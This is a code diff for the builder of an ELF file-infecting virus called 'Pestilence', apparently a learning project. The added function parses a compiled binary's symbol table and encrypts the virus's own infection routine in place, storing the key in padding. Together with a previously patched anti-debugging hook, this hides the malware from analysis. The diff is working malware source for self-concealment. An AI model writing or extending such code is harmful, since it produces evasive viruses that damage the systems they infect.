@@ -4,8 +4,11 @@
 #include <string.h>
 #include <sys/mman.h>
 #include <elf.h>
+#include <strings.h>
+#include <stdlib.h>
 
 extern int _crc32(void *mem, unsigned int len);
+void	*_encrypt_zone(unsigned char *zone, size_t size, unsigned char *new_zone, unsigned char *key);
 
 size_t	file_size(int fd)
 {
@@ -186,6 +189,73 @@ void patch_jmp_table_offset(void *mmaped) {
 	*(unsigned long*)(_table_offset + 24) = (unsigned long)_checkdbg_by_status_file;
 }
 
+void 	encrypt_pestilence_infection_routine(void *mmaped) {
+	Elf64_Ehdr	*header;
+	Elf64_Shdr *sec;
+	Elf64_Shdr *sec_sym;
+	Elf64_Sym 	*sym;
+	unsigned char *text_sec;
+	unsigned int i;
+	unsigned long _encrypted_part_start;
+	unsigned long _table_offset;
+	unsigned long _padding;
+	unsigned long _o_entry;
+	unsigned long _start;
+	char *file_content;
+	char *strtab;
+	unsigned char *key;
+	unsigned long start_to_encrypt;
+	size_t size_to_encrypt;
+
+	header = mmaped;
+	sec = mmaped + header->e_shoff;
+
+	file_content = mmaped + sec[header->e_shstrndx].sh_offset;
+
+	i = 0;
+	while (i < header->e_shnum) {
+		if (sec->sh_type == SHT_SYMTAB) {
+			sec_sym = sec;
+			sym = mmaped + sec->sh_offset;
+		} else if (sec->sh_type == SHT_STRTAB && !strcmp(file_content + sec->sh_name, ".strtab")) {
+			strtab = mmaped + sec->sh_offset;
+		} else if (sec->sh_type == SHT_PROGBITS && !strcmp(file_content + sec->sh_name, ".text")) {
+			text_sec = mmaped + sec->sh_offset;
+		}
+		sec++;
+		i++;
+	}
+
+	i = 0;
+	while (i < sec_sym->sh_size) {
+		if (!strcmp(strtab + sym->st_name, "_encrypted_part_start")) {
+			_encrypted_part_start = sym->st_value;
+		} else if (!strcmp(strtab + sym->st_name, "_o_entry")) {
+			_o_entry = sym->st_value;
+		} else if (!strcmp(strtab + sym->st_name, "_start")) {
+			_start = sym->st_value;
+		} else if (!strcmp(strtab + sym->st_name, "_table_offset")) {
+			_table_offset = sym->st_value;
+		} else if (!strcmp(strtab + sym->st_name, "_padding")) {
+			_padding = sym->st_value;
+		}
+		i += sym->st_size + sizeof(Elf64_Sym);
+		sym = (void*)sym + sym->st_size + sizeof(Elf64_Sym);
+	}
+
+	start_to_encrypt = (_encrypted_part_start - _o_entry) + (unsigned long)text_sec;
+	size_to_encrypt = _table_offset - _encrypted_part_start;
+	key = _encrypt_zone((void*)start_to_encrypt, size_to_encrypt, (void*)start_to_encrypt, NULL);
+	start_to_encrypt = (_table_offset - _o_entry) + (unsigned long)text_sec;
+	size_to_encrypt = 128;
+	_encrypt_zone((void*)start_to_encrypt, size_to_encrypt, (void*)start_to_encrypt, key);
+	start_to_encrypt = (_table_offset - _o_entry) + (unsigned long)text_sec + 128;
+	size_to_encrypt = _padding - (_table_offset + 128);
+	_encrypt_zone((void*)start_to_encrypt, size_to_encrypt, (void*)start_to_encrypt, key);
+	memcpy((void*)(text_sec + (_padding - _o_entry)), key, 256);
+	munmap(key, 256);
+}
+
 int main(void) {
 	int fd;
 	size_t fd_size;
@@ -196,6 +266,7 @@ int main(void) {
 	mmaped = mmap(0, fd_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
 	patch_table_offset(mmaped);
 	patch_jmp_table_offset(mmaped);
+	encrypt_pestilence_infection_routine(mmaped);
 	patch_checksum_infos(mmaped);
 	munmap(mmaped, fd_size);
 	close(fd);
